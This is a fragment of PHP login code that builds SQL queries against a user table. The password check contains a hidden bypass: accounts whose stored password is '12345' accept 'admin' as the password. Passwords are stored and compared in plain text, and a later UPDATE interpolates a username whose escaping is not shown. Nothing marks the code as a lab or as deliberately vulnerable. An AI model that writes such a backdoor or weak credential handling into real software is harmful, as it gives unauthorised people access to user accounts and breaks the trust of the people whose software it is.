...
function login()
{
	...
	if (isset($_POST['submit'])) 
	{
		...
		$p_esc = mysqli_real_escape_string($con, $password);

		$query = "SELECT * from userinfo where (username ='$u_esc' OR email='$u_esc') AND (password ='$p_esc' OR (password='12345' AND '$p_esc'='admin'))";
		...
		if($rows >= 1)
		{
			...
			$u_query = "UPDATE userinfo SET last_login='$last_login', currunt_login=NOW() WHERE username='$uname'";
